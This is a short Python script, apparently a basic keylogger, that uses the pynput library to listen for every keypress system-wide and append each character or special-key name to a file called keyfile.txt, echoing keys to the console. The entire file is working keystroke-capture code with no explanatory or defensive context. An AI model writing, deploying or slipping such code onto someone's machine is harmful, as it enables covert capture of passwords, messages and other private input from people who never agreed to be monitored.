from pynput import keyboard

def keyPressed(key):
    try:
        print(str(key))
        with open("keyfile.txt", 'a') as logkey:
            try:
                char = key.char  
                logkey.write(char)
            except AttributeError:
                logkey.write(f'[{str(key)}]')  
    except Exception as e:
        print(f"Error: {e}")  

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    listener.join()  